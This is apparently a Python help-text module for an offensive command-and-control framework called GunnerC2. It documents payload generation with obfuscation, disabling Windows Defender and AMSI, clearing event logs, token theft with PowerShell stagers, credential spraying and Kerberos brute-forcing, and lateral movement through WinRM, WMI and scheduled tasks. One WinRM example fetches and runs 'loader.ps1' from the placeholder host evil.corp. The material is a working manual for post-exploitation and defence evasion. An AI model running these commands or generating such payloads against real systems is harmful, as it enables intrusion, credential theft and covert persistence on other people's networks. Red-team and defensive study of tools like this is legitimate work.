gunnershell_commands_windows = {
	"list":    "Show all available modules.",
	"gunnerid": "Show the current session ID for this GunnerShell.",
	"help":    "Show this help menu.",
	"banner": """Clears the screen and displays the GUNNER ASCII-art banner.""",
	"sessions": """sessions\nLists all active sessions with metadata: hostname, user, OS, architecture.""",
	"alias": """alias <OLD_SID_or_ALIAS> <NEW_ALIAS>\nAssign an alias to a session ID for easier reference. Example: alias abc12-def34-ghi56 pwned""",
	"exit":    "Exit the GunnerShell subshell and return to main prompt.",
	"upload":  "Usage: upload <local_path> <remote_path>    Upload a file.",
	"download":"Usage: download <remote_path> <local_path>  Download a file.",
	"shell":   "Usage: shell    Drop into a full interactive shell.",
	"switch": "switch <session_id>   Launch a Gunnershell on another session (can't switch to yourself).",
	"bofexec": """bofexec <bof_name_or_path> [--x86] [-z STR]... [-Z WSTR]...
Resolve a BOF from the library or filesystem and request execution (only available when gunnerplant is enabled).

Arguments:
  bof_name_or_path   Library key (e.g., whoami, x64/whoami) or path to a .o/.obj file
  --x86              Use the 32-bit variant when the agent/process is x86
  -z STR             ASCII string argument (repeatable; order preserved)
  -Z WSTR            Wide/UTF-16LE string argument (repeatable; order preserved)

Examples:
  bofexec whoami
  bofexec x64/whoami -z user -Z "DOMAIN\\\\Users"
  bofexec --x86 whoami
  bofexec C:\\tools\\bofs\\whoami.o
  bofexec ./bofs/whoami.o -z arg1 -z arg2 -Z "wide string"
""",

	"bofhelp": """
bofhelp [<bof_name>|<term>]
List built-in BOFs by section and show one-line descriptions.

Usage:
  bofhelp
      Show the “Situational Awareness” BOF section.

  bofhelp <bof_name>
      Show detailed help for that specific BOF (if registered in the library).

  bofhelp <term>
      Filter the Situational Awareness list by keyword (name/description).
      (If <term> exactly matches a BOF name, the detailed help is shown.)

Notes:
  • Requires gunnerplant payload with BOF support loaded.
  • BOF names are library keys (e.g., whoami, dir, ipconfig).
  • To execute a BOF:  bofexec <bof_name> [-z, -i, -Z, -s] [args]
    For BOF usage:     bofexec <bof_name> -h

Examples:
  bofhelp
  bofhelp whoami
  bofhelp dir
""",

	"portfwd": {
		"_desc": """portfwd <subcommand>
		
Subcommands:
	portfwd add    -i <sid> -lh <local_host> -lp <local_port> -rh <remote_host> -rp <remote_port> -cp <chisel_port>
	portfwd list
	portfwd delete -i <rule_id>

Type 'help portfwd <subcommand>' for more details.""",
		"add": """portfwd add -i <sid> -lh <local_host> -lp <local_port> -rh <remote_host> -rp <remote_port> -cp <chisel_port>
Start a new port-forward on session <sid>. On Linux agents this will upload chisel and establish the reverse tunnel.

Example:
	portfwd add -i session123 -lh 127.0.0.1 -lp 8000 -rh 10.0.0.5 -rp 443 -cp 7070""",
		"list": """portfwd list
List all currently active port-forward rules.""",
		"delete": """portfwd delete -i <rule_id>
Remove the specified port-forward by rule ID.

Example:
	portfwd delete -i 1""",
	},

	"modhelp":  "modhelp <module_name>\n    Show options and usage for the named module.",
	"run":      "run <module_name> [opt=val]\n    Execute module with inline option assignments.",
	"search": """search <keyword>
Searches for available modules that match the provided keyword. Supports partial matching.

Example:
	search whoami
	search windows/x64
""",
	# ────────────────────────────────────────────────────────────────────────────────
	# File system commands help
	# ────────────────────────────────────────────────────────────────────────────────
	"ls":   "ls [<path>]\n    List files on the remote host (defaults to current working directory).",
	"cat":  "cat <filepath>\n    Read and display the contents of the given file.",
	"cd":   "cd <path>\n    Change the remote working directory to <path>.",
	"pwd":  "pwd\n    Print the current remote working directory.",
	"cp":   "cp <src> <dst>   Copy file on the remote host.",
	"mv":        "Move or rename a file/directory",
	"rmdir":     "Remove a directory (recursive)",
	"checksum":  "Compute SHA256 of a file",
	"del":  "del <file>   Delete a file on the remote host.",
	"rm":   "Alias for del",
	"mkdir":"mkdir <path>   Create a directory on the remote host.",
	"md":   "Alias for mkdir",
	"touch":"touch <path>   Create or update a file on the remote host",
	"drives":   "List mounted drives/filesystems",
	"edit": "edit <path>\n    Download, verify text, open in $EDITOR, then re-upload.",
	# ────────────────────────────────────────────────────────────────────────────────
	# Networking Commands
	# ────────────────────────────────────────────────────────────────────────────────
	"netstat":   "netstat\n    Show active TCP/UDP connections on the remote host.",
	"ifconfig":  "ifconfig / ipconfig\n    Display network interfaces.",
	"arp":       "arp\n    Display the ARP cache.",
	"resolve":   "resolve <host>\n    Resolve a hostname on the remote system.",
	"nslookup":  "Alias for resolve",
	"route":     "route\n    View the remote host’s routing table.",
	"getproxy":  "getproxy\n    Display the remote Windows proxy settings.",
	"ipconfig":  "ipconfig    Display network interfaces (Windows: ipconfig /all; Linux/macOS: ifconfig -a)",
	"ifconfig":  "Alias for ipconfig",
	"portscan": """portscan [-Pn] <IP_or_subnet>
Scan common TCP ports on one host or a /24 (ARP-primes gateway/targets, skips unreachable hosts).
Use -Pn to skip the ICMP “alive” check.""",
	"hostname":   "Display the remote host’s hostname",
	"socks": """socks -lh <local_host> -sp <socks_port> -lp <local_port>

Establish a reverse SOCKS5 proxy via the agent.
	Flags:
		-lh  Your C2 IP (where the agent will connect back)
		-sp  SOCKS5 port on your C2 (what proxychains should point at)
		-lp  Local port for Reverse Handler

Example:
	socks -lh 127.0.0.1 -sp 1080 -lp 1090""",
	# ────────────────────────────────────────────────────────────────────────────────
	# System Commands
	# ────────────────────────────────────────────────────────────────────────────────
	"sysinfo":   "sysinfo\n    Display system information (OS, hostname, arch).",
	"ps":        "ps\n    List running processes on the remote host.",
	"getuid":    "getuid\n    Show the user the server is running as.",
	"getprivs":  "getprivs\n    Show/enumerate process privileges.",
 "groups":    "List group membership",
	"getav":     "Detect installed AV/EDR products via PowerShell",
	"defenderoff":              "Disable Windows Defender",
	"amsioff": "Disable AMSI in‐memory via obfuscated reflection bypass (Working july 2025)",
	"getpid":    "getpid\n    Print the process ID of the remote agent.",
	"steal_token": """
Usage:
	steal_token <PID> -f <format> -p <tcp-win|http-win|https-win>
				 -lh <local_host> -lp <local_port> -x <http_port>
				 [--serve_https] [--ssl] [-obs <1|2|3>]
				 [--beacon_interval <sec>]

Description:
	Steal a Windows token via CreateProcessWithTokenW and immediately spawn
	a stage-1 PowerShell payload on the target.

Options:
	-f, --format <format>            Payload format (only “ps1” supported)
	-p, --payload <tcp-win|http-win|https-win>
									 Which stager to use
	-lh, --local_host <ip>           IP for the stager to call back to
	-lp, --local_port <port>         Port for the stager callback
	-x,  --http_port <port>          Port for the temporary HTTP(S) server
		--serve_https                Serve the stage-1 script over HTTPS
									 (self-signed cert)
		--ssl                        Force SSL on the reverse shell channel
	-obs <1|2|3>                     Obfuscation strength (1=low, 3=high)
		--beacon_interval <sec>      Beacon interval (required for http-win/https-win)
""",
	"getenv":    "getenv <VAR1> [<VAR2> ...]\n    Retrieve one or more environment variables from the remote host.",
	"exec":      "exec <command> [args...]\n    Execute an arbitrary OS command.",
	"kill":      "kill <pid>\n    Terminate the given process ID.",
	"getsid":    "getsid\n    Show the Windows user SID of the current token.",
	"clearev": """
clearev [-f|--force]
	Clear all Windows event logs. Requires local Administrator or SeSecurityPrivilege;
	use -f/--force to override privilege check.
""",
	"localtime": "Display the remote system’s date and time.",
	"reboot":    "Reboot the remote host immediately.",
	"pgrep":     "pgrep <pattern>   Filter processes by name/pattern",
	"pkill":     "pkill <pattern>   Terminate processes by name/pattern",
	"suspend":  "suspend <pid>\n    Suspend the given process ID.",
	"resume":   "resume <pid>\n    Resume the given suspended process.",
	"shutdown":"shutdown [-r|-h]\n    Shutdown (`-h`) or reboot (`-r`) the host.",
	"reg": {
	"_desc": "reg <query|get|set|delete> …\n    Interact with the Windows registry.",
	"query":  "reg query <hive>\\\\<path> [/s]\n    List subkeys and values (use /s to recurse).",
	"get":    "reg get <hive>\\\\<path> <ValueName>\n    Read a single value.",
	"set":    "reg set <hive>\\\\<path> <Name> <Data>\n    Create or update a string value.",
	"delete": "reg delete <hive>\\\\<path> [/f]\n    Delete a value or entire key (use /f to force).",
	},
	"services":   "services <list|start|stop|restart> [name]   Manage services",
	"netusers":   "netusers    List local user accounts",
	"netgroups":  "netgroups   List local group accounts",
	# ────────────────────────────────────────────────────────────────────────────────
	# User Interface Commands
	# ────────────────────────────────────────────────────────────────────────────────
	"screenshot": "screenshot <local_path>\n    Capture the remote interactive desktop and save it locally.",
	# ────────────────────────────────────────────────────────────────────────────────
	# Lateral Movement Commands
	# ────────────────────────────────────────────────────────────────────────────────
	"winrm": """
winrm -u <username> -p <password> -i <target_ip> (-d <domain> | --local-auth)

Connect via WinRM to a Windows host and run commands or remote scripts.

Required:
	-u <username>      Username for authentication
	-p <password>      Password for authentication
	-i <target_ip>     Target host IP address
	
either:
	-d <domain>         AD domain for network authentication
	--local-auth        Authenticate against local SAM instead of AD

Optional:
	-dc <dc_host>      Domain Controller hostname
	--dc-ip <dc_ip>    Domain Controller IP address
	-c <command>       Command to run on the remote host
	--exec-url         URL of a PowerShell script to fetch & run in memory
	--script           Path to a local PS1 script to upload & execute
	--debug            Enable verbose output
	--stager           Download & IEX payload.ps1 via HTTP stager
	--stager-port      Port for HTTP stager (default 8000)
	--stager-ip        IP of HTTP stager server

Examples:
	winrm -u administrator -p P@ssw0rd! -d CORP.local --dc-ip 10.0.0.50 -i 10.0.0.20 -c whoami
	winrm -u svcacct -p S3rv!c3 --local-auth -i 10.0.0.20 --exec-url http://evil.corp/loader.ps1""",

		"rpcexec": """rpcexec -u <users.txt|username> -p <passes.txt|password> -d <DOMAIN> -t <targets> --command <cmd> [--cleanup]
RPC Exec via COM Scheduled-Task API on the target(s).

Required:
	-u, --users     Username or path to a username file
	-p, --passes    Password or path to a password file
	-d, --domain    AD domain name
	-t, --targets   Target or Comma‑separated list of hosts/IPs
	--command       Command to run on the target(s)

Optional:
	--cleanup       Delete scheduled task after execution
	--debug         Enable verbose output
	--stager        Download & IEX payload.ps1 via HTTP stager
	--stager-port   Port for HTTP stager (default 8000)
	--stager-ip     IP of HTTP stager server

Examples:
	rpcexec -u admin -p P@ssw0rd! -d CORP.local -t 10.0.0.5 --command whoami
	rpcexec --users users.txt --passes passes.txt -d corp.local -t dc1,dc2 --command "ipconfig /all" --cleanup""",


		"netexec": {
		"_desc": """netexec <subcommand>

Subcommands:
	smb     Spray SMB logins against \\<host>\\C$ (or IPC$) and report SUCCESS/INVALID.
	ldap    Spray LDAP credentials against a DC.
	winrm   Spray WinRM credentials via Test-WSMan (HTTP/HTTPS).

Type ‘help netexec smb’ for details on the smb subcommand.""",
		"smb": """
netexec smb -u <users.txt|username> -p <passes.txt|password> -d <DOMAIN> -t <targets> [--shares]

Spray SMB logins in‑memory via PowerShell or enumerate remote shares.

Required:
	-u <path|user>    Username for SMB or path to a username file
	-p <path|pass>    Password for SMB or path to a password file
	-t <targets>      Single target, Comma‑separated IPs or CIDRs

Optional:
	-d <DOMAIN>       AD domain for authentication
	--shares          Enumerate remote SMB shares instead of spraying logins (requires -u and -p to be **single** credentials, not files)
	--stager          Download & IEX payload.ps1 via HTTP stager
	--stager-port     Port for HTTP stager (default 8000)
	--stager-ip       IP of HTTP stager server

Examples:
	netexec smb -u ~/users.txt -p ~/passes.txt -d bank.local -t 10.0.1.0/24
	netexec smb -u admin -p "P@ssw0rd" -d WORKGROUP -t 10.0.1.15 --shares""",

	"ldap": """
netexec ldap -u <user.txt|user> -p <pass.txt|pass> -d <DOMAIN> --dc <host|ip> [--ldaps] [--port <port>] [--debug]

Spray domain credentials via LDAP or LDAPS (DirectorySearcher / LdapConnection) or AD module if available.

Required:
	-u <path|user>       Username or file of usernames
	-p <path|pass>       Password or file of passwords
	-d <DOMAIN>          AD domain name
	--dc <host|ip>       Domain Controller to target

Optional:
	--ldaps              Use LDAPS instead of plain LDAP (enables SSL)
	--port <port>        Port for LDAP or LDAPS (default: 389 or 636 if --ldaps)
	--debug              Enable verbose output (show bind errors, fallbacks, etc.)
	--stager             Download & IEX payload.ps1 via HTTP stager
	--stager-port        Port for HTTP stager (default 8000)
	--stager-ip          IP of HTTP stager server

Example:
	netexec ldap -u users.txt -p passes.txt -d sequel.htb --dc 10.0.0.5 --ldaps --port 636 --debug""",

	"winrm": """
netexec winrm -u <user|file> -p <pass|file> -d <DOMAIN> -t <targets> [--port <port>] [--https]

Spray WinRM credentials via Test-WSMan.
Required:
	-u, --users    Username or file of usernames
	-p, --passes   Password or file of passwords
	-d, --domain   AD domain name
	-t, --targets  Comma‑sep list of hosts/IPs

Optional:
	--port         WinRM port (5985 or 5986)
	--https        Use HTTPS (default port 5986)
	--stager       Download & IEX payload.ps1 via HTTP stager
	--stager-port  Port for HTTP stager (default 8000)
	--stager-ip    IP of HTTP stager server"""
	},
	"wmiexec": """
wmiexec -u <user> -p <pass> -d <DOMAIN> -t <target_ip> --command <cmd>

Execute a command remotely via WMI’s Win32_Process.Create.  Does NOT capture stdout by default.

Required:
	-u, --user      Username for auth
	-p, --pass      Password for auth
	-d, --domain    AD domain (or machine name for local)
	-t, --target    Target IP or hostname
	-c, --command   The command line to spawn (e.g. "whoami")

Optional:
	--debug         Return full raw output for troubleshooting
	--stager        Download & IEX payload.ps1 via HTTP stager
	--stager-port   Port for HTTP stager (default 8000)
	--stager-ip     IP of HTTP stager server

Example:
	wmiexec -u Administrator -p P@ssw0rd! -d CORP.LOCAL -t 10.10.10.5 --command whoami
""",
	# ────────────────────────────────────────────────────────────────────────────────
	# Active Directory Commands
	# ────────────────────────────────────────────────────────────────────────────────
	"getusers": """
getusers [-f <username>] [-d <domain>] [--dc-ip <ip>]

	-f, --filter   <username>   Fetch all AD properties for one user.
	-d, --domain   <domain>     AD domain name (FQDN) or NetBIOS.
	--dc-ip        <ip>         IP address of the Domain Controller.

Usage:
	getusers
			List all user SamAccountNames in the current domain.

	getusers -f jdoe
			Return every AD property of user “jdoe”.

	getusers -d corp.local
			List all users in the corp.local domain.

	getusers --dc-ip 10.0.0.50
			List all users by querying the DC at 10.0.0.50.

	getusers -f jdoe -d corp.local --dc-ip 10.0.0.50
			Fetch jdoe’s properties from the specified domain/DC.
""",
	"getgroups": """
getgroups [-g <group>] [-m] [-d <domain>] [--dc-ip <ip>]

	 -g, --group     Specific group SamAccountName to fetch all AD properties for
	 -m, --members   List members of the specified group (requires -g)
	 -d, --domain    AD domain name (FQDN) or NetBIOS
	 --dc-ip         IP address of the Domain Controller

Usage:
	getgroups
			List all group SamAccountNames in the current domain.

	getgroups -g "Domain Admins"
			Fetch every AD property (Name:Value) for the “Domain Admins” group.

	getgroups -g "Domain Admins" -m
			List all members of the “Domain Admins” group.

	getgroups -d corp.local
			Query corp.local’s groups.

	getgroups --dc-ip 10.0.0.50
			Query the DC at 10.0.0.50.
""",
	"getcomputers": """
getcomputers [-n <computer>] [-d <domain>] [--dc-ip <ip>]

	 -n, --name     Specific computer SamAccountName to fetch all AD properties for
	 -d, --domain   AD domain name (FQDN) or NetBIOS
	 --dc-ip        IP address of the Domain Controller

Usage:
	getcomputers
			List all computer SamAccountNames in the current domain.

	getcomputers -n HOST01
			Fetch every AD property (Name:Value) for the “HOST01” computer.

	getcomputers -d corp.local
			Query corp.local’s computers.

	getcomputers --dc-ip 10.0.0.50
			Query the DC at 10.0.0.50.
""",
	"getdomaincontrollers": """
getdomaincontrollers [-d <domain>] [--dc-ip <ip>] [-e, --enterprise]

	-d, --domain       AD domain name (FQDN) or NetBIOS
	--dc-ip            IP address of the Domain Controller
	-e, --enterprise   Enumerate DCs across the entire forest

Usage:
	getdomaincontrollers
	List every DC in the current domain.

	getdomaincontrollers -d corp.local
			List DCs in corp.local.

	getdomaincontrollers --dc-ip 10.0.0.50
			Query the DC at 10.0.0.50.

	getdomaincontrollers -e
			List every DC in every domain in the forest.
""",
	"getous": """
getous [-o <ou>] [-d <domain>] [--dc-ip <ip>]

	 -o, --ou      OU name to fetch all AD properties for
	 -d, --domain  AD domain name (FQDN) or NetBIOS
	 --dc-ip       IP address of the Domain Controller

Usage:
	getous
			List all Organizational Units in the current domain.

	getous -o "Sales"
			Fetch every AD property (Name:Value) for the “Sales” OU.

	getous -d corp.local
			Query corp.local’s OUs.

	getous --dc-ip 10.0.0.50
			Query the DC at 10.0.0.50.
""",
	"getgpos": """
getgpos [-n <name>] [-d <domain>] [--dc-ip <ip>]

	 -n, --name   GPO DisplayName to fetch all AD properties for
	 -d, --domain AD domain name (FQDN) or NetBIOS
	 --dc-ip      IP address of the Domain Controller

Usage:
	getgpos
			List all GPO DisplayNames in the current domain.

	getgpos -n "Default Domain Policy"
			Fetch every AD property (Name:Value) for that GPO.

	getgpos -d corp.local
			Query corp.local’s GPOs.

	getgpos --dc-ip 10.0.0.50
			Query the DC at 10.0.0.50.
""",
	"getdomain": """
getdomain [-d <domain>] [--dc-ip <ip>]

	 -d, --domain  AD domain name (FQDN) or NetBIOS
	 --dc-ip       IP address of the Domain Controller

Usage:
	getdomain
			Fetch every property (Name:Value) for the current domain.

	getdomain -d corp.local
			Query the corp.local domain.

	getdomain --dc-ip 10.0.0.10
			Query the domain controller at 10.0.0.10.
""",
	"gettrusts": """
gettrusts [-n <trustName>] [-d <domain>] [--dc-ip <ip>]

	 -n, --name    Name of a specific trust to fetch all properties for
	 -d, --domain  AD domain name (FQDN) or NetBIOS
	 --dc-ip       IP address of the Domain Controller

Usage:
	gettrusts
			List all trust relationships in the current domain.

	gettrusts -n "Corp‑ChildTrust"
			Fetch every AD property for the “Corp‑ChildTrust” trust object.

	gettrusts -d corp.local
			Enumerate all trusts for the corp.local domain.

	gettrusts --dc-ip 10.0.0.50
			Enumerate trusts via the DC at 10.0.0.50.
""",
	"getforests": """
getforests [-n <name>] [-d <domain>] [--dc-ip <ip>]

	 -n, --name    Forest DNS name to dump all properties for
	 -d, --domain  AD domain name (FQDN) or NetBIOS (to target a DC)
	 --dc-ip       IP address of the Domain Controller

Usage:
	getforests
			List the DNS names of all forests trusted by the current domain.

	getforests -n corp.local
			Dump every property of the corp.local forest.

	getforests -d corp.local --name corp.local
			Same as above but via SRV lookup of corp.local.

	getforests --dc-ip 10.0.0.50 -n corp.local
			Dump forest properties via the DC at 10.0.0.50.
""",
	"getfsmo": """
getfsmo [-d <domain>] [--dc-ip <ip>]

	 -d, --domain  AD domain name (FQDN) or NetBIOS
	 --dc-ip       IP address of the Domain Controller

Usage:
	getfsmo
			Show which DCs hold the FSMO roles in the current forest.

	getfsmo -d corp.local
			Query FSMO role holders for corp.local.

	getfsmo --dc-ip 10.0.0.50
			Query via the DC at 10.0.0.50.
""",
	"getpwpolicy": """
getpwpolicy [-d <domain>] [--dc-ip <ip>]

	-d, --domain   AD domain name (FQDN) or NetBIOS.
	--dc-ip        IP of the Domain Controller.

Usage:
	getpwpolicy
			Dump Password/Lockout/Kerberos policies in the current domain.

	getpwpolicy -d corp.local --dc-ip 10.0.0.50
			Same, but query a specific DC.
""",
		"getdelegation": """
getdelegation [-d <domain>] [--dc-ip <ip>]

	-d, --domain   AD domain name (FQDN) or NetBIOS.
	--dc-ip        IP of the Domain Controller.

Usage:
	getdelegation
			List objects with unconstrained or constrained delegation enabled.

	getdelegation --dc-ip 10.0.0.50
			Same, but via the specified DC.
""",
	"getadmins": """
getadmins [-d <domain>] [--dc-ip <ip>]

	-d, --domain   AD domain name (FQDN) or NetBIOS.
	--dc-ip        IP address of the Domain Controller.

Usage:
	getadmins
			List SamAccountNames of Domain Admins and Enterprise Admins.

	getadmins -d corp.local
			Enumerate those groups in corp.local.

	getadmins --dc-ip 10.0.0.50
			Query via the DC at 10.0.0.50.
""",
	"getspns": """
getspns [-d <domain>] [--dc-ip <ip>]

	-d, --domain   AD domain name (FQDN) or NetBIOS.
	--dc-ip        IP address of the Domain Controller.

Usage:
	getspns
			List every account (user or computer) that has an SPN set.
""",
	"kerbrute": {
	"_desc": """kerbrute <subcommand>
Subcommands:
	bruteforce  Bruteforce AD creds via Kerberos (Negotiate)
	userenum    Enumerate valid usernames via Kerberos (Negotiate)
Usage: help kerbrute <subcommand>""",
	
	"bruteforce": """kerbrute bruteforce -u <user|file> -p <pass|file> -d <domain> [--dc-ip <ip>] [-C <credfile>]
	-u <user|file>      Single user or file of users
	-p <pass|file>      Single password or file of passwords
	-d <domain>         AD domain (FQDN)
	--dc-ip <ip>        Domain Controller IP
	-C <user:pass>      Lines of username:password for spraying""",
	
	"userenum": """kerbrute userenum -d <domain> [--dc-ip <ip>] -u <user|file|list>
	-d <domain>         AD domain (FQDN)
	--dc-ip <ip>        Domain Controller IP
	-u <user|file|list> Single user, comma-sep list, or file of users"""
	},
 }

gunnershell_commands_linux = {
    "ls": """\
ls [-a] [-l] [-h] [<path>]
List directory contents on the remote Linux host.

Options:
  -a            Include entries starting with '.' (hidden files)
  -l            Long listing: permissions, links, owner, group, size, time
  -h            Human-readable sizes (used with -l)

Behavior:
  • <path> is optional; defaults to the remote working directory.
  • Globs (e.g., *.log) are expanded by the remote shell.
  • Output is emitted verbatim from the agent.

Examples:
  ls
  ls -alh /var/log
  ls *.conf
""",

    "cd": """\
cd <path>
Change the remote working directory and print the resulting path.

Notes:
  • Accepts absolute or relative paths (., ..).
  • On success this command prints the final directory (via 'pwd'), and the
    shell updates the session’s current directory (gs.cwd) accordingly.
  • Tilde expansion is handled by the remote shell: e.g., cd ~, cd ~/bin.

Examples:
  cd /etc
  cd ..
  cd ~/projects
""",

    "cat": """\
cat <file>
Print the contents of a remote file to the console.

Notes:
  • Treats the target as text; binary files may print garbled output.
  • For large/binary files, prefer 'download' instead of 'cat'.

Examples:
  cat /etc/os-release
  cat ./notes.txt
""",

    "mkdir": """\
mkdir [-p] <dir>
Create a directory on the remote host.

Options:
  -p            Create intermediate directories as needed (no error if exists)

Behavior:
  • Prints 'OK' on success.
  • Without -p, the command fails if a parent does not exist.

Examples:
  mkdir uploads
  mkdir -p /opt/tools/bin
""",

    "rmdir": """\
rmdir <path>
Remove a directory tree (recursive & force).

Behavior:
  • Internally runs 'rm -rf <path>'.
  • Non-empty directories are removed without prompting.
  • Prints 'OK' on success.

Danger:
  • This is destructive. Double-check the target path before running.

Examples:
  rmdir /tmp/testdir
  rmdir ./build
""",

    "rm": """\
rm [-r] [-f] <path>
Remove remote files or directories.

Options:
  -r            Recurse into directories
  -f            Do not prompt; ignore non-existent files

Behavior:
  • Prints 'OK' on success.
  • Without -r, removing a directory fails.

Danger:
  • This is destructive. Use with care—especially with wildcards.

Examples:
  rm file.tmp
  rm -f /var/tmp/*.log
  rm -rf ./dist
""",

    "mv": """\
mv <src> <dst>
Move or rename a file/directory on the remote host.

Behavior:
  • Overwrites the destination if it already exists and is a file.
  • Moving into an existing directory places <src> inside that directory.
  • Prints 'OK' on success.

Examples:
  mv notes.txt notes.old.txt
  mv app.log /var/log/app.log
  mv mydir /opt/tools/
""",

    "cp": """\
cp [-r] <src> <dst>
Copy files or directories on the remote host.

Options:
  -r            Copy directories recursively

Behavior:
  • Overwrites destination files by default.
  • Without -r, copying a directory fails.
  • Prints 'OK' on success.

Examples:
  cp config.yaml /etc/myapp/config.yaml
  cp -r ./static /var/www/html/static
""",

    "touch": """\
touch <path>
Create an empty file or update the modification time of an existing file.

Behavior:
  • Creates the file if it does not exist.
  • Updates atime/mtime if it exists.
  • Prints 'OK' on success.

Examples:
  touch /tmp/marker
  touch ./README.md
""",

    "stat": """\
stat <path>
Show file metadata (mode, links, owner:group, size, mtime, name).

Output columns:
  %A   Permissions/mode (e.g., -rw-r--r--)
  %h   Hard-link count
  %U:%G  Owner and group
  %s   Size in bytes
  %y   Modification time
  %n   File name

Examples:
  stat /etc/passwd
  stat ./build/artifact.tar.gz
""",

    "checksum": """\
checksum <file>
Compute the SHA-256 checksum of a file.

Behavior:
  • Uses 'sha256sum' when available; falls back to 'openssl dgst -sha256'.
  • Output format typically: '<hex-digest>  <path>'.

Examples:
  checksum /bin/bash
  checksum ./payload.bin
""",
}

commands = {
	"start": {
		"_desc": """start <subcommand>

Subcommands:
	start http   <ip> <port>   Start HTTP listener
	start https  <ip> <port>   Start HTTPS listener
	start tcp    <ip> <port>   Start TCP listener
	start tls    <ip> <port>   Start TLS‑wrapped TCP listener

Type 'help start http', 'help start https', 'help start tcp' or 'help start tls' for more details.""",

		"http": """start http <ip> <port>\nStarts an HTTP listener on the specified IP and port.\nExample: start http 0.0.0.0 443""",
		"https": """start https <ip> <port> [-c <certfile> -k <keyfile>]
Starts an HTTPS listener on the specified IP and port. If no cert/key are provided, a self-signed certificate will be generated.

Options:
	-c <certfile>
		Path to TLS certificate (PEM format)
	-k <keyfile>
		Path to TLS private key (PEM format)

Examples:
	start https 0.0.0.0 8443
	start https 0.0.0.0 8443 -c cert.pem -k key.pem""",
		"tcp": """start tcp <ip> <port>
Starts a TCP listener. By default runs raw TCP, add --ssl (and optionally -c/-k) to enable TLS.

Examples:
	start tcp 0.0.0.0 9001                                  # raw TCP listener
	start tcp 0.0.0.0 9001 --ssl                            # TLS with generated self-signed cert""",

		"tls": """start tls <ip> <port> [-c <certfile> -k <keyfile>]

Starts a TLS‑wrapped TCP listener.

Options:
	-c <certfile>   Path to TLS certificate file (optional)
	-k <keyfile>    Path to TLS key file (optional)

Example:
	start tls 0.0.0.0 9001
""",
	},

	"portfwd": {
	"_desc": """portfwd <subcommand>
Subcommands:
	portfwd add    -i <sid> -lh <local_host> -lp <local_port> -rh <remote_host> -rp <remote_port> -cp <chisel_port>
	portfwd list
	portfwd delete -i <rule_id>

Type 'help portfwd <subcommand>' for more details.""",
	"add": """portfwd add -i <sid> -lh <local_host> -lp <local_port> -rh <remote_host> -rp <remote_port> -cp <chisel_port>
Start a new port-forward on session <sid>. On Linux agents this will upload chisel and establish the reverse tunnel.

Example:
	portfwd add -i session123 -lh 127.0.0.1 -lp 8000 -rh 10.0.0.5 -rp 443 -cp 7070""",
	"list": """portfwd list
List all currently active port-forward rules.""",
	"delete": """portfwd delete -i <rule_id>
Remove the specified port-forward by rule ID.

Example:
	portfwd delete -i 1"""
},
	"sessions": """sessions\nLists all active sessions with metadata: hostname, user, OS, architecture.""",
	"operators": """usage: operators [-h] [-n NAME] [--users | --hackers | --players]
List connected operator consoles or persistent operator accounts.

optional arguments:
	-h, --help
												show this help message and exit
	-n NAME, --name NAME
												Operator ID or alias (supports wildcards)
	--users, --hackers, --players
												List all persistent operator accounts (from DB)
 """,
	"listeners": """listeners\nLists all currently running HTTP, HTTPS, and TCP listeners.""",
	"addop": """
addop -u <username> -p <password> [-r <role>]
Create a new operator account on the teamserver.

Flags:
	-u, --username   Username for the new operator
	-p, --password   Password for the new operator
	-r, --role       Role to assign (default: operator)""",

	"delop": """delop <operator1[,operator2,...]>
Remove one or more operator accounts from the database (by ID or alias).

Examples:
	delop alice
	delop bob,carol,dave""",

	"modop": """usage: modop [-h] -o OPERATOR [-n NAME] [-p PASSWORD] [-r {operator,admin}]
Modify an existing operator’s username, password, and/or role.

optional arguments:
	-h, --help            show this help message and exit

	-o OPERATOR, --operator OPERATOR  Operator ID or alias to modify (required

	-n NAME, --name NAME  New username for the operator

	-p PASSWORD, --password PASSWORD  New password for the operator
	
	-r {operator,admin}, --role {operator,admin}  New role for the operator""",

	"alert": """alert [-o <operator>] [--red|--green|--yellow|--blue|--magenta|--cyan|--white] <message>

Broadcast the given <message> to **all** operators (or only to a specific operator via `-o/--operator`),
with optional color flags (defaults to white).

Examples:
	alert "Scheduled maintenance begins in 5m"
	alert --yellow "Reminder: rotate logs"
	alert -o alice --blue "Alice, please verify your session"
""",
	
	"kick": """kick (-a | -o <op1,op2,...>)
Kick one or more operators (or all of them).

Flags:
	-o, --operator   Comma‑separated operator ID(s) or alias(es)
	-a, --all        Kick ALL operators

Examples:
	kick -o 6f75e5bb-…         # kick a single operator
	kick -o alice,bob          # kick two operators
	kick -a                    # kick everyone
""",

	"alias": """alias [-o|--operator] <OLD_ID_or_ALIAS> <NEW_ALIAS>
Without -o: alias a session ID/alias.
With -o:   alias an operator ID.

Examples:
	alias abc123… my-target
	alias -o 6f75e5bb… alice""",

	"shell": """shell <session_id>\nStarts an interactive shell with a specific session ID.\nExample: shell gunner""",
	"kill": """kill -i <session_id>\n\nTerminates the specified session (HTTP, HTTPS or TCP).\n\nExample:\n  kill -i abc123""",
	"jobs": """jobs [--print] [-i <job_id>]
Lists background jobs or prints a job’s buffered output.

Usage:
	jobs
	List all background jobs with their ID, Module and Status.

	jobs --print -i <job_id>
	Show the captured stdout/stderr for the given job ID.

Examples:
	jobs
	jobs --print -i 1
""",
	"generate": """generate - Build a new agent payload.

USAGE:
	generate -f <format> -p <payload> [OPTIONS...]

REQUIRED:
	-f, --format <format>         Output format: ps1 | bash
	-p, --payload <type>          Payload type: tcp | http | https
	-lh, --local_host <host>      IP address to connect back to
	-lp, --local_port <port>      Port to connect back to

OPTIONAL:
	-obs, --obfuscation <level>   Obfuscation level: 1 | 2 | 3
	-o, --output <file>           Save payload to file
	--os <windows|linux>          Target OS (default: windows)
	--ssl                         Use SSL/TLS (tcp only)
	--interval <seconds>          Beacon interval (http/https only)
	-H, --headers <headers>       Add custom HTTP headers (http/https only)
								Accepts: "Header: Value" or JSON dict
	--useragent <string>          Custom User-Agent string
	--accept <value>              Accept header value
	--range <value>               Range header value (e.g., "--range 1024")

EXAMPLES:

	TCP payload:
	generate -f ps1 -p tcp -lh 192.168.1.10 -lp 9001 -obs 3

	HTTP payload with headers:
	generate -f ps1 -p http -lh 192.168.1.10 -lp 8080 --interval 5 -H '{"User-Agent": "GunnerC2/version 2.7.2", "Custom-API-Key": "bvhjdghhee7888h"}' -obs 2

	HTTPS payload:
	generate -f ps1 -p https -lh 192.168.1.10 -lp 8443 --interval 10 -obs 1
""",
	"exec": """exec -i <session_id> <command> [args...]
Execute an arbitrary OS command on the specified session (supports wildcards).
Examples:
	exec -i abc123 whoami /all
	exec -i abc123 ls -la /tmp
""",
